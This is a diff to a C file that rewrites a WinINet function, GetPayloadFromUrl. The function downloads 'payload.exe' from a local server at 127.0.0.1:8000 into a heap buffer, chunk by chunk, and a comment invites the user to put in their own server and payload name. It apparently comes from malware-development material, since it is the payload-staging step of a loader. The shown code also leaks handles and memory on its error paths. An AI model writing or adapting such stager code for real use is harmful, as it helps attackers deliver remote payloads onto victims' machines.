@@ -3,46 +3,66 @@
 #include <wininet.h>
 
 BOOL GetPayloadFromUrl() {
-    HINTERNET hInternet = NULL, hInternetFile = NULL;
-    PBYTE pBytes = NULL;
-    DWORD dwBytesRead = 0;
-    BOOL result = FALSE;
-    
-    hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); // write your own user-agent or equal NULL
-    if (hInternet == NULL) {
-        printf("[!] InternetOpenW Failed With Error : %d\n", GetLastError());
-        return FALSE;
-    }
 
-    hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/payload.exe", NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0); // write your target server's ip and payload name
-    if (hInternetFile == NULL) {
-        printf("[!] InternetOpenUrlW Failed With Error : %d\n", GetLastError());
-        InternetCloseHandle(hInternet);
-        return FALSE;
-    }
+	HINTERNET	hInternet              = NULL,
+			    hInternetFile          = NULL;
+	
+	DWORD		dwBytesRead            = NULL;
+  
+	SIZE_T		sSize                   = NULL;
+	
+	PBYTE		pBytes                  = NULL; 
+	PBYTE		pTmpBytes               = NULL; 
 
-    pBytes = (PBYTE)LocalAlloc(LPTR, 272);
-    if (pBytes == NULL) {
-        printf("[!] LocalAlloc Failed With Error : %d\n", GetLastError());
-        InternetCloseHandle(hInternetFile);
-        InternetCloseHandle(hInternet);
-        return FALSE;
-    }
+	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
+	if (hInternet == NULL) {
+		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
 
-    if (!InternetReadFile(hInternetFile, pBytes, 272, &dwBytesRead)) {
-        printf("[!] InternetReadFile Failed With Error : %d\n", GetLastError());
-        goto cleanup;
-    }
+	hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/payload.exe", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL); // write your own server's ip and payload name
+	if (hInternetFile == NULL) {
+		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
 
-    result = TRUE;
+	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+	if (pTmpBytes == NULL) {
+		return FALSE;
+	}
 
-cleanup:
-    if (pBytes) LocalFree(pBytes);
-    if (hInternetFile) InternetCloseHandle(hInternetFile);
-    if (hInternet) InternetCloseHandle(hInternet);
-    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+	while (TRUE) {
+		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+			return FALSE;
+		}
+		sSize += dwBytesRead;
 
-    return result;
+		if (pBytes == NULL)
+			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+		else{
+			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+        }
+		if (pBytes == NULL) {
+			return FALSE;
+		}
+
+		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+
+		memset(pTmpBytes, '\0', dwBytesRead);
+		if (dwBytesRead < 1024) {
+			break;
+		}
+
+	}
+
+	InternetCloseHandle(hInternet);
+	InternetCloseHandle(hInternetFile);
+	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+	LocalFree(pTmpBytes);
+	LocalFree(pBytes);
+
+	return TRUE;
 }
 
 int main(int argc, char *argv[]) {
